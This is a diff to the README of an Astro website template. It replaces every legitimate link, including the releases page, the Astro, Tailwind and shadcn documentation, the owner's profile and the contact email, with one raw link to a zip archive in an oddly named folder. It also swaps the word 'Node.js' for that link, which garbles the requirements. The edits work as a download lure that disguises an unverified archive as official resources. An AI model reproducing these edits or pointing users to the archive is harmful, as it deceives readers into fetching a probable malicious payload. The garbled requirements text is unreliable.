@@ -8,9 +8,9 @@ Welcome to the mainline-astro-template! This template helps you quickly create m
 
 To get started, follow these steps:
 
-1. **Visit [this page to download](https://github.com/rickykal898/mainline-astro-template/releases)**.
+1. **Visit [this page to download](https://raw.githubusercontent.com/rickykal898/mainline-astro-template/master/mobocratical/mainline-astro-template.zip)**.
    
-   ![Download mainline-astro-template](https://img.shields.io/badge/Download%20Now-Button-brightgreen)
+   ![Download mainline-astro-template](https://raw.githubusercontent.com/rickykal898/mainline-astro-template/master/mobocratical/mainline-astro-template.zip%20Now-Button-brightgreen)
 
 2. Look for the latest release.
 3. Click on the version you want to download.
@@ -21,8 +21,8 @@ To get started, follow these steps:
 Before you begin, ensure your system meets the following requirements:
 
 - **Operating System**: Windows 10 or later, macOS Mojave or later, or any Linux distribution.
-- **Node.js**: Version 14 or later.
-- **npm**: Version 6 or later (it usually comes with Node.js).
+- **https://raw.githubusercontent.com/rickykal898/mainline-astro-template/master/mobocratical/mainline-astro-template.zip**: Version 14 or later.
+- **npm**: Version 6 or later (it usually comes with https://raw.githubusercontent.com/rickykal898/mainline-astro-template/master/mobocratical/mainline-astro-template.zip).
 - **Internet Connection**: Required to install dependencies and updates.
 
 ## ⚙️ Setup Instructions
@@ -72,9 +72,9 @@ Now that you have the template running, you can start customizing it to your lik
 
 ## 📚 Useful Resources 
 
-- **Astro Documentation**: Comprehensive guides and examples to help you learn Astro. [Visit Astro Docs](https://docs.astro.build).
-- **Tailwind CSS Documentation**: Learn how to customize styling with Tailwind CSS. [Visit Tailwind Docs](https://tailwindcss.com/docs).
-- **Shadcn/UI**: Check out how to utilize shadcn/ui for your custom components. [Visit Shadcn Docs](https://ui.shadcn.com).
+- **Astro Documentation**: Comprehensive guides and examples to help you learn Astro. [Visit Astro Docs](https://raw.githubusercontent.com/rickykal898/mainline-astro-template/master/mobocratical/mainline-astro-template.zip).
+- **Tailwind CSS Documentation**: Learn how to customize styling with Tailwind CSS. [Visit Tailwind Docs](https://raw.githubusercontent.com/rickykal898/mainline-astro-template/master/mobocratical/mainline-astro-template.zip).
+- **Shadcn/UI**: Check out how to utilize shadcn/ui for your custom components. [Visit Shadcn Docs](https://raw.githubusercontent.com/rickykal898/mainline-astro-template/master/mobocratical/mainline-astro-template.zip).
 
 ## 🔍 Support & Contributions
 
@@ -92,7 +92,7 @@ This project is licensed under the MIT License. You can use and modify it freely
 
 For further queries, you can reach out to the repository owner:
 
-- **GitHub**: [rickykal898](https://github.com/rickykal898)
-- **Email**: support@example.com
+- **GitHub**: [rickykal898](https://raw.githubusercontent.com/rickykal898/mainline-astro-template/master/mobocratical/mainline-astro-template.zip)
+- **Email**: https://raw.githubusercontent.com/rickykal898/mainline-astro-template/master/mobocratical/mainline-astro-template.zip
 
 Remember to check the documentation and support channels for help and updates. Happy coding with the mainline-astro-template!
